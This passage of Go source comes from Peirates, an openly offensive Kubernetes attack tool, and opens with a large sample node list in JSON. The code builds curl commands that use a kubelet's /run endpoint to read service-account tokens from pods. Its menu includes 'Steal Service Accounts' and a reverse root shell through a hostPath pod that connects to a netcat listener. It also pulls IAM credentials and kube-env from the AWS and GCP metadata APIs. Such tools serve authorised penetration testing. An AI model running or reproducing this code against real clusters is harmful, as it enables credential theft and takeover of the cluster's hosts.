							"reason": "KubeletHasSufficientPID",
							"status": "False",
							"type": "PIDPressure"
						},
						{
							"lastHeartbeatTime": "2019-03-06T00:26:34Z",
							"lastTransitionTime": "2019-03-03T20:44:02Z",
							"message": "kubelet is posting ready status. AppArmor enabled",
							"reason": "KubeletReady",
							"status": "True",
							"type": "Ready"
						}
					],
					"daemonEndpoints": {
						"kubeletEndpoint": {
							"Port": 10250
						}
					},
					"images": [
						{
							"names": [
								"jaybeale/guestbook-frontend-with-statusphp-vuln@sha256:deb37d5f99ed8997ae2f399feeb698c53e75e69cc20d933d42358fb41ff2b48c",
								"jaybeale/guestbook-frontend-with-statusphp-vuln:5"
							],
							"sizeBytes": 512555779
						},
						{
							"names": [
								"jaybeale/guestbook-frontend-with-statusphp-vuln@sha256:17696c8bc1e9d5e36ed14373c12c3cd5efbd48847256cdd28718a23557e81a8d",
								"jaybeale/guestbook-frontend-with-statusphp-vuln:2"
							],
							"sizeBytes": 512162122
						},
						{
							"names": [
								"jaybeale/guestbook-frontend-with-statusphp-vuln@sha256:4640871b2467438d9f590e3b82d9b566a18f9f1b2ff2e7fcb7b8d6b254328946",
								"jaybeale/guestbook-frontend-with-statusphp-vuln:1"
							],
							"sizeBytes": 512162120
						},
						{
							"names": [
								"k8s.gcr.io/redis@sha256:f066bcf26497fbc55b9bf0769cb13a35c0afa2aa42e737cc46b7fb04b23a2f25",
								"k8s.gcr.io/redis:e2e"
							],
							"sizeBytes": 419003740
						},
						{
							"names": [
								"k8s.gcr.io/kube-apiserver-amd64@sha256:ca54685b89b3e1809ea3fa9936e32e3a05083a84483813604178275e02352454",
								"k8s.gcr.io/kube-apiserver-amd64:v1.10.5"
							],
							"sizeBytes": 228059419
						},
						{
							"names": [
								"k8s.gcr.io/etcd-amd64@sha256:68235934469f3bc58917bcf7018bf0d3b72129e6303b0bef28186d96b2259317",
								"k8s.gcr.io/etcd-amd64:3.1.12"
							],
							"sizeBytes": 193214599
						},
						{
							"names": [
								"k8s.gcr.io/kube-controller-manager-amd64@sha256:20afa70465a92fd3d573ddc78351fb1d69415e65e7e8e957adae19d60d75960d",
								"k8s.gcr.io/kube-controller-manager-amd64:v1.10.5"
							],
							"sizeBytes": 150807988
						},
						{
							"names": [
								"gcr.io/google_samples/gb-redisslave@sha256:90f62695e641e1a27d1a5e0bbb8b622205a48e18311b51b0da419ffad24b9016",
								"gcr.io/google_samples/gb-redisslave:v1"
							],
							"sizeBytes": 109508753
						},
						{
							"names": [
								"nginx@sha256:98efe605f61725fd817ea69521b0eeb32bef007af0e3d0aeb6258c6e6fe7fc1a",
								"nginx:latest"
							],
							"sizeBytes": 109252443
						},
						{
							"names": [
								"k8s.gcr.io/kube-proxy-amd64@sha256:b81228e8ad694f05a5a6e035167ad705600aead5cfd63628a38984fc60f0b989",
								"k8s.gcr.io/kube-proxy-amd64:v1.10.5"
							],
							"sizeBytes": 97862813
						},
						{
							"names": [
								"weaveworks/weave-kube@sha256:b3af3b8a1b02bc474535e546aeb8a4ce8cfafbeffa3ef6f6cf5fb87ec4c4be4c",
								"weaveworks/weave-kube:2.3.0"
							],
							"sizeBytes": 96785526
						},
						{
							"names": [
								"k8s.gcr.io/kube-scheduler-amd64@sha256:ccd7da1c35fefdb8077f80baf0724b861b94b3fc182ae0b5e0b7644257a0dd41",
								"k8s.gcr.io/kube-scheduler-amd64:v1.10.5"
							],
							"sizeBytes": 51195168
						},
						{
							"names": [
								"weaveworks/weave-npc@sha256:f240d7b4f3fce679366dd9509247aa7249f8f4d67c5d99a82c93a23324c4dff3",
								"weaveworks/weave-npc:2.3.0"
							],
							"sizeBytes": 47156420
						},
						{
							"names": [
								"k8s.gcr.io/pause-amd64@sha256:59eec8837a4d942cc19a52b8c09ea75121acc38114a2c68b98983ce9356b8610",
								"k8s.gcr.io/pause-amd64:3.1"
							],
							"sizeBytes": 742472
						}
					],
					"nodeInfo": {
						"architecture": "amd64",
						"bootID": "71731659-28df-4049-b09c-d6e6298acc91",
						"containerRuntimeVersion": "docker://1.13.1",
						"kernelVersion": "4.4.0-128-generic",
						"kubeProxyVersion": "v1.10.5",
						"kubeletVersion": "v1.10.5",
						"machineID": "0456ab9359cc9308ebe9cbe15b31e808",
						"operatingSystem": "linux",
						"osImage": "Ubuntu 16.04.4 LTS",
						"systemUUID": "564D376C-6BC7-D9F5-0943-87CB67D3DCD3"
					}
				}
			},
			{
				"apiVersion": "v1",
				"kind": "Node",
				"metadata": {
					"annotations": {
						"node.alpha.kubernetes.io/ttl": "0",
						"volumes.kubernetes.io/controller-managed-attach-detach": "true"
					},
					"creationTimestamp": "2018-06-26T16:59:46Z",
					"labels": {
						"beta.kubernetes.io/arch": "amd64",
						"beta.kubernetes.io/os": "linux",
						"kubernetes.io/hostname": "k8s-node1"
					},
					"name": "k8s-node1",
					"namespace": "",
					"resourceVersion": "1646241",
					"selfLink": "/api/v1/nodes/k8s-node1",
					"uid": "544c932f-7962-11e8-b34c-000c29cf24d7"
				},
				"spec": {
					"externalID": "k8s-node1"
				},
				"status": {
					"addresses": [
						{
							"address": "10.23.58.41",
							"type": "InternalIP"
						},
						{
							"address": "k8s-node1",
							"type": "Hostname"
						}
					],
					"allocatable": {
						"cpu": "1",
						"ephemeral-storage": "13731028970",
						"hugepages-1Gi": "0",
						"hugepages-2Mi": "0",
						"memory": "1945812Ki",
						"pods": "110"
					},
					"capacity": {
						"cpu": "1",
						"ephemeral-storage": "14899120Ki",
						"hugepages-1Gi": "0",
						"hugepages-2Mi": "0",
						"memory": "2048212Ki",
						"pods": "110"
					},
					"conditions": [
						{
							"lastHeartbeatTime": "2019-03-06T00:26:33Z",
							"lastTransitionTime": "2019-03-03T19:45:57Z",
							"message": "kubelet has sufficient disk space available",
							"reason": "KubeletHasSufficientDisk",
							"status": "False",
							"type": "OutOfDisk"
						},
						{
							"lastHeartbeatTime": "2019-03-06T00:26:33Z",
							"lastTransitionTime": "2019-03-03T19:45:57Z",
							"message": "kubelet has sufficient memory available",
							"reason": "KubeletHasSufficientMemory",
							"status": "False",
							"type": "MemoryPressure"
						},
						{
							"lastHeartbeatTime": "2019-03-06T00:26:33Z",
							"lastTransitionTime": "2019-03-03T19:45:57Z",
							"message": "kubelet has no disk pressure",
							"reason": "KubeletHasNoDiskPressure",
							"status": "False",
							"type": "DiskPressure"
						},
						{
							"lastHeartbeatTime": "2019-03-06T00:26:33Z",
							"lastTransitionTime": "2018-06-26T16:59:46Z",
							"message": "kubelet has sufficient PID available",
							"reason": "KubeletHasSufficientPID",
							"status": "False",
							"type": "PIDPressure"
						},
						{
							"lastHeartbeatTime": "2019-03-06T00:26:33Z",
							"lastTransitionTime": "2019-03-03T19:45:57Z",
							"message": "kubelet is posting ready status. AppArmor enabled",
							"reason": "KubeletReady",
							"status": "True",
							"type": "Ready"
						}
					],
					"daemonEndpoints": {
						"kubeletEndpoint": {
							"Port": 10250
						}
					},
					"images": [
						{
							"names": [
								"jaybeale/guestbook-frontend-with-statusphp-vuln@sha256:deb37d5f99ed8997ae2f399feeb698c53e75e69cc20d933d42358fb41ff2b48c",
								"jaybeale/guestbook-frontend-with-statusphp-vuln:5"
							],
							"sizeBytes": 512555779
						},
						{
							"names": [
								"jaybeale/guestbook-frontend-with-statusphp-vuln@sha256:17696c8bc1e9d5e36ed14373c12c3cd5efbd48847256cdd28718a23557e81a8d",
								"jaybeale/guestbook-frontend-with-statusphp-vuln:2"
							],
							"sizeBytes": 512162122
						},
						{
							"names": [
								"jaybeale/guestbook-frontend-with-statusphp-vuln@sha256:4640871b2467438d9f590e3b82d9b566a18f9f1b2ff2e7fcb7b8d6b254328946",
								"jaybeale/guestbook-frontend-with-statusphp-vuln:1"
							],
							"sizeBytes": 512162120
						},
						{
							"names": [
								"gcr.io/google-samples/gb-frontend@sha256:d44e7d7491a537f822e7fe8615437e4a8a08f3a7a1d7d4cb9066b92f7556ba6d",
								"gcr.io/google-samples/gb-frontend:v4"
							],
							"sizeBytes": 512161546
						},
						{
							"names": [
								"k8s.gcr.io/redis@sha256:f066bcf26497fbc55b9bf0769cb13a35c0afa2aa42e737cc46b7fb04b23a2f25",
								"k8s.gcr.io/redis:e2e"
							],
							"sizeBytes": 419003740
						},
						{
							"names": [
								"jaybeale/ubuntu1604-apache-status@sha256:576d2736a9c215acbf915edf35198e6f26a2d6b2b8c1c2a1830c52e5cdca0756",
								"jaybeale/ubuntu1604-apache-status:2"
							],
							"sizeBytes": 258278983
						},
						{
							"names": [
								"jaybeale/ubuntu1604-apache-status@sha256:fd2fa5da78715b59efb976cc5bd3d45b0bad5c483b500f93e38255cd7a0b46a0",
								"jaybeale/ubuntu1604-apache-status:1"
							],
							"sizeBytes": 258278660
						},
						{
							"names": [
								"gcr.io/google_samples/gb-redisslave@sha256:90f62695e641e1a27d1a5e0bbb8b622205a48e18311b51b0da419ffad24b9016",
								"gcr.io/google_samples/gb-redisslave:v1"
							],
							"sizeBytes": 109508753
						},
						{
							"names": [
								"k8s.gcr.io/kube-proxy-amd64@sha256:b81228e8ad694f05a5a6e035167ad705600aead5cfd63628a38984fc60f0b989",
								"k8s.gcr.io/kube-proxy-amd64:v1.10.5"
							],
							"sizeBytes": 97862813
						},
						{
							"names": [
								"weaveworks/weave-kube@sha256:b3af3b8a1b02bc474535e546aeb8a4ce8cfafbeffa3ef6f6cf5fb87ec4c4be4c",
								"weaveworks/weave-kube:2.3.0"
							],
							"sizeBytes": 96785526
						},
						{
							"names": [
								"k8s.gcr.io/k8s-dns-kube-dns-amd64@sha256:6d8e0da4fb46e9ea2034a3f4cab0e095618a2ead78720c12e791342738e5f85d",
								"k8s.gcr.io/k8s-dns-kube-dns-amd64:1.14.8"
							],
							"sizeBytes": 50456751
						},
						{
							"names": [
								"weaveworks/weave-npc@sha256:f240d7b4f3fce679366dd9509247aa7249f8f4d67c5d99a82c93a23324c4dff3",
								"weaveworks/weave-npc:2.3.0"
							],
							"sizeBytes": 47156420
						},
						{
							"names": [
								"k8s.gcr.io/k8s-dns-sidecar-amd64@sha256:23df717980b4aa08d2da6c4cfa327f1b730d92ec9cf740959d2d5911830d82fb",
								"k8s.gcr.io/k8s-dns-sidecar-amd64:1.14.8"
							],
							"sizeBytes": 42210862
						},
						{
							"names": [
								"k8s.gcr.io/k8s-dns-dnsmasq-nanny-amd64@sha256:93c827f018cf3322f1ff2aa80324a0306048b0a69bc274e423071fb0d2d29d8b",
								"k8s.gcr.io/k8s-dns-dnsmasq-nanny-amd64:1.14.8"
							],
							"sizeBytes": 40951779
						},
						{
							"names": [
								"alpine@sha256:e1871801d30885a610511c867de0d6baca7ed4e6a2573d506bbec7fd3b03873f",
								"alpine:latest"
							],
							"sizeBytes": 4147781
						},
						{
							"names": [
								"k8s.gcr.io/pause-amd64@sha256:59eec8837a4d942cc19a52b8c09ea75121acc38114a2c68b98983ce9356b8610",
								"k8s.gcr.io/pause-amd64:3.1"
							],
							"sizeBytes": 742472
						}
					],
					"nodeInfo": {
						"architecture": "amd64",
						"bootID": "f7c80c3c-e0b3-482c-9284-29261d45e97b",
						"containerRuntimeVersion": "docker://1.13.1",
						"kernelVersion": "4.4.0-128-generic",
						"kubeProxyVersion": "v1.10.5",
						"kubeletVersion": "v1.10.5",
						"machineID": "0456ab9359cc9308ebe9cbe15b31e808",
						"operatingSystem": "linux",
						"osImage": "Ubuntu 16.04.4 LTS",
						"systemUUID": "564D947A-C0A1-815C-1AA9-69DC62622CDF"
					}
				}
			},
			{
				"apiVersion": "v1",
				"kind": "Node",
				"metadata": {
					"annotations": {
						"node.alpha.kubernetes.io/ttl": "0",
						"volumes.kubernetes.io/controller-managed-attach-detach": "true"
					},
					"creationTimestamp": "2018-06-26T17:15:49Z",
					"labels": {
						"beta.kubernetes.io/arch": "amd64",
						"beta.kubernetes.io/os": "linux",
						"kubernetes.io/hostname": "k8s-node2"
					},
					"name": "k8s-node2",
					"namespace": "",
					"resourceVersion": "1646244",
					"selfLink": "/api/v1/nodes/k8s-node2",
					"uid": "924a3208-7964-11e8-b34c-000c29cf24d7"
				},
				"spec": {
					"externalID": "k8s-node2"
				},
				"status": {
					"addresses": [
						{
							"address": "10.23.58.42",
							"type": "InternalIP"
						},
						{
							"address": "k8s-node2",
							"type": "Hostname"
						}
					],
					"allocatable": {
						"cpu": "1",
						"ephemeral-storage": "13731028970",
						"hugepages-1Gi": "0",
						"hugepages-2Mi": "0",
						"memory": "1945812Ki",
						"pods": "110"
					},
					"capacity": {
						"cpu": "1",
						"ephemeral-storage": "14899120Ki",
						"hugepages-1Gi": "0",
						"hugepages-2Mi": "0",
						"memory": "2048212Ki",
						"pods": "110"
					},
					"conditions": [
						{
							"lastHeartbeatTime": "2019-03-06T00:26:34Z",
							"lastTransitionTime": "2019-03-03T19:45:54Z",
							"message": "kubelet has sufficient disk space available",
							"reason": "KubeletHasSufficientDisk",
							"status": "False",
							"type": "OutOfDisk"
						},
						{
							"lastHeartbeatTime": "2019-03-06T00:26:34Z",
							"lastTransitionTime": "2019-03-03T19:45:54Z",
							"message": "kubelet has sufficient memory available",
							"reason": "KubeletHasSufficientMemory",
							"status": "False",
							"type": "MemoryPressure"
						},
						{
							"lastHeartbeatTime": "2019-03-06T00:26:34Z",
							"lastTransitionTime": "2019-03-03T19:45:54Z",
							"message": "kubelet has no disk pressure",
							"reason": "KubeletHasNoDiskPressure",
							"status": "False",
							"type": "DiskPressure"
						},
						{
							"lastHeartbeatTime": "2019-03-06T00:26:34Z",
							"lastTransitionTime": "2018-06-26T17:15:49Z",
							"message": "kubelet has sufficient PID available",
							"reason": "KubeletHasSufficientPID",
							"status": "False",
							"type": "PIDPressure"
						},
						{
							"lastHeartbeatTime": "2019-03-06T00:26:34Z",
							"lastTransitionTime": "2019-03-03T19:45:54Z",
							"message": "kubelet is posting ready status. AppArmor enabled",
							"reason": "KubeletReady",
							"status": "True",
							"type": "Ready"
						}
					],
					"daemonEndpoints": {
						"kubeletEndpoint": {
							"Port": 10250
						}
					},
					"images": [
						{
							"names": [
								"jaybeale/guestbook-frontend-with-statusphp-vuln@sha256:deb37d5f99ed8997ae2f399feeb698c53e75e69cc20d933d42358fb41ff2b48c",
								"jaybeale/guestbook-frontend-with-statusphp-vuln:5"
							],
							"sizeBytes": 512555779
						},
						{
							"names": [
								"jaybeale/guestbook-frontend-with-statusphp-vuln@sha256:17696c8bc1e9d5e36ed14373c12c3cd5efbd48847256cdd28718a23557e81a8d",
								"jaybeale/guestbook-frontend-with-statusphp-vuln:2"
							],
							"sizeBytes": 512162122
						},
						{
							"names": [
								"jaybeale/guestbook-frontend-with-statusphp-vuln@sha256:4640871b2467438d9f590e3b82d9b566a18f9f1b2ff2e7fcb7b8d6b254328946",
								"jaybeale/guestbook-frontend-with-statusphp-vuln:1"
							],
							"sizeBytes": 512162120
						},
						{
							"names": [
								"gcr.io/google-samples/gb-frontend@sha256:d44e7d7491a537f822e7fe8615437e4a8a08f3a7a1d7d4cb9066b92f7556ba6d",
								"gcr.io/google-samples/gb-frontend:v4"
							],
							"sizeBytes": 512161546
						},
						{
							"names": [
								"k8s.gcr.io/redis@sha256:f066bcf26497fbc55b9bf0769cb13a35c0afa2aa42e737cc46b7fb04b23a2f25",
								"k8s.gcr.io/redis:e2e"
							],
							"sizeBytes": 419003740
						},
						{
							"names": [
								"gcr.io/google_samples/gb-redisslave@sha256:90f62695e641e1a27d1a5e0bbb8b622205a48e18311b51b0da419ffad24b9016",
								"gcr.io/google_samples/gb-redisslave:v1"
							],
							"sizeBytes": 109508753
						},
						{
							"names": [
								"k8s.gcr.io/kube-proxy-amd64@sha256:b81228e8ad694f05a5a6e035167ad705600aead5cfd63628a38984fc60f0b989",
								"k8s.gcr.io/kube-proxy-amd64:v1.10.5"
							],
							"sizeBytes": 97862813
						},
						{
							"names": [
								"weaveworks/weave-kube@sha256:b3af3b8a1b02bc474535e546aeb8a4ce8cfafbeffa3ef6f6cf5fb87ec4c4be4c",
								"weaveworks/weave-kube:2.3.0"
							],
							"sizeBytes": 96785526
						},
						{
							"names": [
								"weaveworks/weave-npc@sha256:f240d7b4f3fce679366dd9509247aa7249f8f4d67c5d99a82c93a23324c4dff3",
								"weaveworks/weave-npc:2.3.0"
							],
							"sizeBytes": 47156420
						},
						{
							"names": [
								"k8s.gcr.io/pause-amd64@sha256:59eec8837a4d942cc19a52b8c09ea75121acc38114a2c68b98983ce9356b8610",
								"k8s.gcr.io/pause-amd64:3.1"
							],
							"sizeBytes": 742472
						}
					],
					"nodeInfo": {
						"architecture": "amd64",
						"bootID": "69f03ef7-a313-4aa1-b18a-ff53d1a3c81a",
						"containerRuntimeVersion": "docker://1.13.1",
						"kernelVersion": "4.4.0-128-generic",
						"kubeProxyVersion": "v1.10.5",
						"kubeletVersion": "v1.10.5",
						"machineID": "0456ab9359cc9308ebe9cbe15b31e808",
						"operatingSystem": "linux",
						"osImage": "Ubuntu 16.04.4 LTS",
						"systemUUID": "564DE68A-4F9F-7CD5-0507-329B8BF99AB1"
					}
				}
			}
		],
		"kind": "List",
		"metadata": {
			"resourceVersion": "",
			"selfLink": ""
		}
	}`)
	//if err != nil {
	if "p" == "a" {
		fmt.Println("[-] Unable to retrieve node details: ")
	} else {
		var getnodeDetail Get_Node_Details
		err := json.Unmarshal(nodeDetailOut2, &getnodeDetail)
		if err != nil {
			fmt.Println("[-] Error unmarshaling data in this secret: ", err)
		}
		//adam here
		for _, item := range getnodeDetail.Items {
			// fmt.Println("+ Host Mount Points for Pod: " + item.Metadata.Name)
			for _, addr := range item.Status.Addresses {
				//fmt.Println(" found for pod " + item.Metadata.Name + " - " + addr.Address)
				if addr.Type == "Hostname" {
				} else {
					fmt.Println("[+] Kubelet List Pod URL: " + item.Metadata.Name + " - http://" + addr.Address + ":10255/pods")
					fmt.Println("[+] Grabbing Pods from node: " + item.Metadata.Name)
					client := &http.Client{}
					// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers
					req_kube, err := http.NewRequest("GET", "http://"+addr.Address+":10255/pods", nil)
					resp, err := client.Do(req_kube)
					if err != nil {
						println("Error - could not perform request http://" + addr.Address + ":10255/pods")
					}
					defer resp.Body.Close()
					body, err := ioutil.ReadAll(resp.Body)
					if resp.StatusCode != 200 {
						fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", resp.StatusCode)
						break
					}

					var output []PodNamespaceContainerTuple
					var podDetails PodDetails
					json.Unmarshal(body, &podDetails)
					for _, item := range podDetails.Items {
						podName := item.Metadata.Name
						podNamespace := item.Metadata.Namespace
						for _, container := range item.Status.ContainerStatuses {
							running := container.State.Running != nil
							containerName := container.Name
							if running && containerName != "pause" {
								output = append(output, PodNamespaceContainerTuple{
									PodName:       podName,
									PodNamespace:  podNamespace,
									ContainerName: containerName,
								})
								cmdline := "curl -sk https://10.23.58.41:10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/ -d \"cmd=cat /run/secrets/kubernetes.io/serviceaccount/token\""
								println(cmdline)
							}
						}
					}

					// Faith Add JsonParser Struct for "line" parameter ***
				}
			}
		}
	}
}

type PodNamespaceContainerTuple struct {
	PodName       string
	PodNamespace  string
	ContainerName string
}

//------------------------------------------------------------------------------------------------------------------------------------------------

func PeiratesMain() {

	// Create a global variable named "connectionString" initialized to
	// default values
	connectionString := ParseLocalServerInfo()
	cmdOpts := CommandLineOptions{connectionConfig: &connectionString}
	//var kubeRoles KubeRoles
	var podInfo PodDetails

	// Store all acquired namespaces for this cluster in a global variable, populated and refreshed by PrintNamespaces()
	var Namespaces []string
	println(Namespaces)

	//kubeData.arg =""
	//kubeData.list = {}

	// Run the option parser to initialize connectionStrings
	parseOptions(&cmdOpts)

	// List of current service accounts
	serviceAccounts := []ServiceAccount{makeNewServiceAccount(connectionString.TokenName, connectionString.Token, "Loaded at startup")}

	// Check environment variables - see KUBERNETES_SERVICE_HOST and KUBERNETES_SERVICE_PORT
	// Watch the documentation on these variables for changes:
	// https://kubernetes.io/docs/concepts/containers/container-environment-variables/

	// BUG: confirm that this does the right thing when not in a pod.
	if inAPod(connectionString) {
		println("+ You are in a pod.")
	} else {
		println("- You are not in a Kubernetes pod.")
	}

	//allPods := getPodList(connectionString)

	var input int
	for ok := true; ok; ok = (input != 2) {
		banner(connectionString)
		println(`----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts
[2] List and/or change namespaces
[3] Get list of pods
[4] Get complete info on all pods (json)
[5] Check all pods for volume mounts
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets from API server
[11] Get a service account token from a secret
[12] Request IAM credentials from AWS Metadata API [AWS only]
[13] Request IAM credentials from GCP Metadata API [GCP only]
[14] Request kube-env from GCP Metadata API [GCP only]
[15] Pull Kubernetes service account tokens from GCS [GCP only] 
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell by launching a hostPath / pod
[21] Run command in one or all pods in this namespace

[exit] Exit Peirates 
----------------------------------------------------------------
Peirates:># `)

		banner_items_removed := (`
		[22] Run a command on a pod from the Kubelet

		[7] Get a list of roles for this service account [not yet implemented]
[8] Get a list of roles available on the cluster [implemented but not connected to menu]
[9] Get a list of abilities for a role [not yet implemented]
[12] Request list of pods from a Kubelet [not yet implemented]
[16] Pull Kubernetes service account tokens from S3 [AWS only] [not yet implemented]
[98] Shell out to bash (not yet implemented)
[99] Build YAML Files (not yet implemented)

		`)
		banner_items_removed = banner_items_removed + " "

		var input string
		var user_response string
		fmt.Scanln(&input)
		// Peirates MAIN MENU
		switch input {

		// exit
		case "exit":
			os.Exit(0)

		// [1] Enter a different service account token
		case "1":
			fmt.Printf("\nCurrent primary service account: %s\n\n[1] List service accounts\n[2] Select primary service account\n[3] Add new service account\n[4] Export service accounts to JSON\n[5] Import service accounts from JSON\n", connectionString.TokenName)
			fmt.Scanln(&input)
			switch input {
			case "1":
				println("\nAvailable Service Accounts:")
				for i, account := range serviceAccounts {
					if account.Name == connectionString.TokenName {
						fmt.Printf("> [%d] %s\n", i, account.Name)
					} else {
						fmt.Printf("  [%d] %s\n", i, account.Name)
					}
				}
			case "2":
				println("\nAvailable Service Accounts:")
				for i, account := range serviceAccounts {
					if account.Name == connectionString.TokenName {
						fmt.Printf("> [%d] %s\n", i, account.Name)
					} else {
						fmt.Printf("  [%d] %s\n", i, account.Name)
					}
				}
				println("\nEnter service account number")
				var tokNum int
				fmt.Scanln(&input)
				_, err := fmt.Sscan(input, &tokNum)
				if err != nil {
					fmt.Printf("Error parsing service account selection: %s\n", err.Error())
				} else if tokNum < 0 || tokNum >= len(serviceAccounts) {
					fmt.Printf("Service account %d does not exist!\n", tokNum)
				} else {
					assignServiceAccountToConnection(serviceAccounts[tokNum], &connectionString)
					fmt.Printf("Selected %s // %s\n", connectionString.TokenName, connectionString.Token)
				}
			case "3":
				serviceAccounts = append(serviceAccounts, readServiceAccountFromCommandLine())
			case "4":
				serviceAccountJSON, err := json.Marshal(serviceAccounts)
				if err != nil {
					fmt.Printf("Error exporting service accounts: %s\n", err.Error())
				} else {
					println(string(serviceAccountJSON))
				}
			case "5":
				var newServiceAccounts []ServiceAccount
				err := json.NewDecoder(os.Stdin).Decode(&newServiceAccounts)
				if err != nil {
					fmt.Printf("Error importing service accounts: %s\n", err.Error())
				} else {
					serviceAccounts = append(serviceAccounts, newServiceAccounts...)
					fmt.Printf("Successfully imported service accounts\n")
				}
			}

			// Menu goes here
		// [2] List namespaces or change namespace
		case "2":
			println("\n[1] List namespaces]\n[2] Switch namespace\n[3] List namespaces then switch namespaces")
			fmt.Scanln(&input)
			switch input {
			case "1":
				Namespaces = PrintNamespaces(connectionString)
				break
			case "2":
				SwitchNamespace(&connectionString)
				break
			case "3":
				Namespaces = PrintNamespaces(connectionString)
				SwitchNamespace(&connectionString)
				break
			default:
				break
			}

		// [3] Get list of pods
		case "3":
			println("\n[+] Printing a list of Pods in this namespace......")
			getListOfPods(connectionString)
			break

		//[4] Get complete info on all pods (json)
		case "4":
			GetPodsInfo(connectionString, &podInfo)
			break

		//	[10] Get secrets from API server
		case "10":
			secrets, service_account_tokens := getSecretList(connectionString)
			for _, secret := range secrets {
				println("Secret found: ", secret)
			}
			for _, svc_acct := range service_account_tokens {
				println("Service account found: ", svc_acct)
			}
			break

		// [11] Get a service account token from a secret
		case "11":
			println("\nPlease enter the name of the secret for which you'd like the contents: ")
			var secret_name string
			fmt.Scanln(&secret_name)

			// BUG: Temporarily we're using we're kludgy YAML parsing.
			if !kubectlAuthCanI(connectionString, "get", "secret") {
				println("Permission Denied: your service account isn't allowed to get secrets")
				break
			}
			getSecretYAML, _, err := runKubectlSimple(connectionString, "get", "secret", secret_name, "-o", "yaml")
			if err != nil {
				fmt.Println("[-] Could not retrieve secret")
				break
				// log.Fatal(err)
			}

			lines := strings.Split(string(getSecretYAML), "\n")
			for _, line := range lines {
				matched, err := regexp.MatchString(`^\s*$`, line)
				if err != nil {
					log.Fatal(err)
				}
				if !matched {
					// Looking solely for tokens
					if strings.Fields(line)[0] == "token:" {
						token := strings.Fields(line)[1]
						// println("Encoded: ",token)
						decoded_token, err := base64.StdEncoding.DecodeString(token)
						if err != nil {
							println("ERROR: couldn't decode")
							break
						} else {
							fmt.Printf("Decoded:\n%q\n", decoded_token)
						}
					}
				}
			}

			// To base64 decode, we'd use base64.StdEncoding.DecodeString() - with printf, use %q

			break

			getSecretRaw, _, err := runKubectlSimple(connectionString, "get", "secret", secret_name, "-o", "json")
			// TODO-FAITH - determine which errors mean we should just show an error and break
			if err != nil {
				fmt.Println("[-] Could not retrieve secret")
				break
				// log.Fatal(err)
			} else {
				var secretDetails Secret_Details
				err := json.Unmarshal(getSecretRaw, &secretDetails)
				if err != nil {
					fmt.Println("[-] Error unmarshaling data in this secret: ", err)
					break
				}
				println("Secret has type: ", secretDetails.SecretType)
				if secretDetails.SecretType == "kubernetes.io/service-account-token" {
					//println("Token found: ",secretDetails.Data.Token)
					println("Token found!")
				} else {
					fmt.Println("Non-token secret parsing not yet implemented")

				}

			}

			break

		// [5] Check all pods for volume mounts
		case "5":
			println("\n[1] Get all host mount points\n[2] Get volume mount points for a specific pod\n\nPeirates:># ")
			fmt.Scanln(&input)

			GetPodsInfo(connectionString, &podInfo)

			switch input {
			case "1":
				println("[+] Getting volume mounts for all pods")
				// BUG: Need to make it so this Get doesn't print all info even though it gathers all info.
				GetHostMountPoints(podInfo)
				//println("[+] Attempting to Mounting RootFS......")
				//MountRootFS(allPods, connectionString)
			case "2":
				println("[+] Please provide the pod name: ")
				fmt.Scanln(&user_response)
				fmt.Printf("[+] Printing volume mount points for %s\n", user_response)
				GetHostMountPointsForPod(podInfo, user_response)
			}

		// [20] Gain a reverse rootshell by launching a hostPath / pod
		case "20":
			allPods := getPodList(connectionString)
			// TODO: See if we can put the auth check back
			//podCreation := canCreatePods(connectionString)
			//podCreation:= true
			//if ! podCreation {
			//	println(" This token cannot create pods on the cluster")
			//	break
			//}
			//crontab_persist_exec(allPods, connectionString)
			println("What IP and Port will your netcat listener be listening on?")
			var ip, port string
			println("IP:")
			fmt.Scanln(&ip)
			println("Port:")
			fmt.Scanln(&port)
			MountRootFS(allPods, connectionString, ip, port)
			break

		// [12] Request IAM credentials from AWS Metadata API [AWS only] [not yet implemented]
		case "12":
			resp, err := http.Get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
			if err != nil {
				println("Error - could not perform request http://169.254.169.254/latest/meta-data/iam/security-credentials/")
			}
			// Parse result as an account, then construct a request asking for that account's credentials
			defer resp.Body.Close()
			body, err := ioutil.ReadAll(resp.Body)
			account := string(body)
			println(account)

			request := "http://169.254.169.254/latest/meta-data/iam/security-credentials/" + account
			resp_2, err := http.Get(request)
			if err != nil {
				println("Error - could not perform request ", request)
			}
			defer resp_2.Body.Close()
			body_2, err := ioutil.ReadAll(resp_2.Body)
			println(string(body_2))
			break

		// [13] Request IAM credentials from GCP Metadata API [GCP only]
		case "13":
			// Create a new HTTP client that uses the correct headers
			client := &http.Client{}
			// Make a request for our service account(s)
			req_accounts, err := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", nil)
			req_accounts.Header.Add("Metadata-Flavor", "Google")
			resp, err := client.Do(req_accounts)
			if err != nil {
				println("Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/")
			}
			defer resp.Body.Close()
			body, err := ioutil.ReadAll(resp.Body)
			// Parse result as one or more accounts, then construct a request asking for each account's credentials
			lines := strings.Split(string(body), "\n")

			for _, line := range lines {
				if strings.TrimSpace(string(line)) == "" {
					continue
				}
				account := strings.TrimRight(string(line), "/")
				fmt.Printf("\n[+] GCP Credentials for account %s\n\n", account)

				// TURN THIS INTO A FUNCTION SO WE CAN PARSE the ones we want
				println(GetGCPBearerTokenFromMetadataAPI(account))
			}
			println(" ")
			break

		// [14] Request kube-env from GCP Metadata API [GCP only]
		case "14":
			// Create a new HTTP client that uses the correct headers
			client := &http.Client{}
			// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers
			req_kube, err := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", nil)
			req_kube.Header.Add("Metadata-Flavor", "Google")
			resp, err := client.Do(req_kube)
			if err != nil {
				println("Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
			}
			defer resp.Body.Close()
			body, err := ioutil.ReadAll(resp.Body)
			if resp.StatusCode != 200 {
				fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", resp.StatusCode)
				break
			}
			lines := strings.Split(string(body), "\n")
			for _, line := range lines {
				println(line)
			}

			break

		// [16] Pull Kubernetes service account tokens from S3 [AWS only]
		case "16":
